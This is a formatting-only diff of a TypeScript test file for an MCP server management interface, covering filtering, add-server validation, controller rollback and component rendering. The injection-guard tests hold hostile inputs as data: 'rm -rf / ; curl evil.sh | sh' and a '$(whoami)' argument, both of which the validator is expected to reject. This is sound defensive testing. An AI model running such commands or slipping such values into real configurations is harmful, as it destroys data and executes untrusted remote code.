@@ -130,12 +130,8 @@ describe("mcp servers — view logic", () => {
         url: "https://mcp.linear.app",
       }),
     ];
-    expect(filterServers(servers, "query").map((s) => s.name)).toEqual([
-      "sqlite",
-    ]);
-    expect(filterServers(servers, "linear.app").map((s) => s.name)).toEqual([
-      "linear",
-    ]);
+    expect(filterServers(servers, "query").map((s) => s.name)).toEqual(["sqlite"]);
+    expect(filterServers(servers, "linear.app").map((s) => s.name)).toEqual(["linear"]);
     expect(serverHaystack(servers[0])).toContain("query");
   });
 
@@ -228,25 +224,19 @@ describe("mcp servers — add-server validation", () => {
   });
 
   it("rejects shell metacharacters in the command (injection guard)", () => {
-    const result = validateDraft(
-      stdioDraft({ command: "rm -rf / ; curl evil.sh | sh" }),
-    );
+    const result = validateDraft(stdioDraft({ command: "rm -rf / ; curl evil.sh | sh" }));
     expect(result.ok).toBe(false);
     if (!result.ok) expect(result.errors.command).toMatch(/shell/i);
   });
 
   it("rejects shell metacharacters in an argument", () => {
-    const result = validateDraft(
-      stdioDraft({ command: "ok", args: ["fine", "$(whoami)"] }),
-    );
+    const result = validateDraft(stdioDraft({ command: "ok", args: ["fine", "$(whoami)"] }));
     expect(result.ok).toBe(false);
     if (!result.ok) expect(result.errors["args.1"]).toBeTruthy();
   });
 
   it("rejects a non-identifier env key", () => {
-    const result = validateDraft(
-      stdioDraft({ env: [{ key: "bad-key;rm", value: "x" }] }),
-    );
+    const result = validateDraft(stdioDraft({ env: [{ key: "bad-key;rm", value: "x" }] }));
     expect(result.ok).toBe(false);
     if (!result.ok) expect(result.errors["env.0"]).toBeTruthy();
   });
@@ -298,10 +288,7 @@ describe("mcp servers — controller", () => {
 
     // Disable first so we can re-enable and observe the mutation.
     await controller.setEnabled("sqlite", false);
-    expect(
-      controller.getSnapshot().servers.find((s) => s.name === "sqlite")
-        ?.enabled,
-    ).toBe(false);
+    expect(controller.getSnapshot().servers.find((s) => s.name === "sqlite")?.enabled).toBe(false);
 
     const snapshot = controller.getSnapshot();
     expect(snapshot.lifecycle.state).toBe("gateway-restart-required");
@@ -316,16 +303,12 @@ describe("mcp servers — controller", () => {
     const controller = new McpServersController(harness as McpServersEngine);
     await controller.load();
 
-    vi.spyOn(harness.client.mcp, "setEnabled").mockRejectedValueOnce(
-      new Error("boom"),
-    );
+    vi.spyOn(harness.client.mcp, "setEnabled").mockRejectedValueOnce(new Error("boom"));
     await controller.setEnabled("sqlite", false);
 
     const snapshot = controller.getSnapshot();
     // Rolled back to the real (still enabled) state.
-    expect(snapshot.servers.find((s) => s.name === "sqlite")?.enabled).toBe(
-      true,
-    );
+    expect(snapshot.servers.find((s) => s.name === "sqlite")?.enabled).toBe(true);
     expect(snapshot.pending.size).toBe(0);
     expect(snapshot.error).toBeTruthy();
 
@@ -339,11 +322,7 @@ describe("mcp servers — controller", () => {
 
     const state = await controller.test("sqlite");
     expect(state.result?.ok).toBe(true);
-    expect(state.result?.tools?.map((t) => t.name)).toEqual([
-      "query",
-      "execute",
-      "schema",
-    ]);
+    expect(state.result?.tools?.map((t) => t.name)).toEqual(["query", "execute", "schema"]);
     expect(controller.getSnapshot().tests.get("sqlite")?.result?.ok).toBe(true);
 
     controller.dispose();
@@ -420,9 +399,7 @@ describe("mcp servers — controller", () => {
 describe("mcp servers — useMcpServersController", () => {
   it("loads on mount and reflects an add through the snapshot", async () => {
     const harness = makeAdminHarness(mcpNoServersScenario());
-    const { result } = renderHook(() =>
-      useMcpServersController(harness as McpServersEngine),
-    );
+    const { result } = renderHook(() => useMcpServersController(harness as McpServersEngine));
     await waitFor(() => expect(result.current.status).toBe("ready"));
 
     await act(async () => {
@@ -500,21 +477,15 @@ describe("McpServersView — component", () => {
     expect(screen.getByText("sqlite")).toBeInTheDocument();
     expect(screen.getByText("linear")).toBeInTheDocument();
 
-    const sqliteRow = within(
-      screen.getByText("sqlite").closest("li") as HTMLElement,
-    );
+    const sqliteRow = within(screen.getByText("sqlite").closest("li") as HTMLElement);
     expect(sqliteRow.getByText("Local (stdio)")).toBeInTheDocument();
     expect(sqliteRow.getByText("Local subprocess")).toBeInTheDocument();
     expect(sqliteRow.getByText("Connected")).toBeInTheDocument();
     // The redacted env summary shows a count, never the value.
     expect(sqliteRow.getByText(/Environment: 1 hidden/)).toBeInTheDocument();
-    expect(
-      screen.queryByText(/secret-value-never-shown/),
-    ).not.toBeInTheDocument();
+    expect(screen.queryByText(/secret-value-never-shown/)).not.toBeInTheDocument();
 
-    const linearRow = within(
-      screen.getByText("linear").closest("li") as HTMLElement,
-    );
+    const linearRow = within(screen.getByText("linear").closest("li") as HTMLElement);
     expect(linearRow.getByText("Remote (OAuth)")).toBeInTheDocument();
     expect(linearRow.getByText("Not signed in")).toBeInTheDocument();
     expect(linearRow.getByText("Connection error")).toBeInTheDocument();
@@ -532,11 +503,7 @@ describe("McpServersView — component", () => {
 
   it("calls setEnabled when a toggle is flipped", () => {
     const setEnabled = vi.fn();
-    render(
-      <McpServersView
-        state={stubState({ servers: VIEW_SERVERS, setEnabled })}
-      />,
-    );
+    render(<McpServersView state={stubState({ servers: VIEW_SERVERS, setEnabled })} />);
     const switches = screen.getAllByRole("switch");
     fireEvent.click(switches[0]); // sqlite is enabled -> disable
     expect(setEnabled).toHaveBeenCalledWith("sqlite", false);
@@ -544,12 +511,8 @@ describe("McpServersView — component", () => {
 
   it("calls test when the Test button is clicked", () => {
     const test = vi.fn(() => Promise.resolve({ pending: false }));
-    render(
-      <McpServersView state={stubState({ servers: VIEW_SERVERS, test })} />,
-    );
-    const sqliteRow = within(
-      screen.getByText("sqlite").closest("li") as HTMLElement,
-    );
+    render(<McpServersView state={stubState({ servers: VIEW_SERVERS, test })} />);
+    const sqliteRow = within(screen.getByText("sqlite").closest("li") as HTMLElement);
     fireEvent.click(sqliteRow.getByRole("button", { name: /^test$/i }));
     expect(test).toHaveBeenCalledWith("sqlite");
   });
@@ -569,25 +532,17 @@ describe("McpServersView — component", () => {
         },
       ],
     ]);
-    render(
-      <McpServersView state={stubState({ servers: VIEW_SERVERS, tests })} />,
-    );
-    const sqliteRow = within(
-      screen.getByText("sqlite").closest("li") as HTMLElement,
-    );
+    render(<McpServersView state={stubState({ servers: VIEW_SERVERS, tests })} />);
+    const sqliteRow = within(screen.getByText("sqlite").closest("li") as HTMLElement);
     expect(sqliteRow.getByText(/Discovered 2 tools/)).toBeInTheDocument();
     expect(sqliteRow.getByText("execute")).toBeInTheDocument();
   });
 
   it("opens a delete confirmation that warns when tools are available", async () => {
     render(<McpServersView state={stubState({ servers: VIEW_SERVERS })} />);
-    const sqliteRow = within(
-      screen.getByText("sqlite").closest("li") as HTMLElement,
-    );
+    const sqliteRow = within(screen.getByText("sqlite").closest("li") as HTMLElement);
     fireEvent.click(sqliteRow.getByRole("button", { name: /delete sqlite/i }));
-    await waitFor(() =>
-      expect(screen.getByText(/currently exposes tools/i)).toBeInTheDocument(),
-    );
+    await waitFor(() => expect(screen.getByText(/currently exposes tools/i)).toBeInTheDocument());
   });
 
   it("opens the add-server dialog and validates before sending", async () => {
@@ -595,9 +550,7 @@ describe("McpServersView — component", () => {
     render(<McpServersView state={stubState({ add })} />);
     fireEvent.click(screen.getByRole("button", { name: /add server/i }));
 
-    await waitFor(() =>
-      expect(screen.getByText("Add MCP server")).toBeInTheDocument(),
-    );
+    await waitFor(() => expect(screen.getByText("Add MCP server")).toBeInTheDocument());
     // Submitting with a blank name surfaces an error and does not send.
     const submit = screen.getAllByRole("button", { name: /add server/i });
     fireEvent.click(submit[submit.length - 1]);
@@ -608,9 +561,7 @@ describe("McpServersView — component", () => {
   it("shows the Hermes-not-running surface when unavailable", () => {
     render(<McpServersView state={stubState({ status: "unavailable" })} />);
     expect(screen.getByText("Hermes is not running")).toBeInTheDocument();
-    expect(
-      screen.getByRole("searchbox", { name: /filter mcp servers/i }),
-    ).toBeDisabled();
+    expect(screen.getByRole("searchbox", { name: /filter mcp servers/i })).toBeDisabled();
   });
 
   it("shows the no-servers empty state for an empty ready list", () => {
@@ -665,8 +616,6 @@ describe("mcp servers — profile isolation", () => {
     const unrestricted = makeAdminHarness(mcpOAuthAuthMissingScenario(), {
       mode: "unrestricted",
     });
-    expect(sandboxed.cache.keyFor("mcpServers")).not.toBe(
-      unrestricted.cache.keyFor("mcpServers"),
-    );
+    expect(sandboxed.cache.keyFor("mcpServers")).not.toBe(unrestricted.cache.keyFor("mcpServers"));
   });
 });
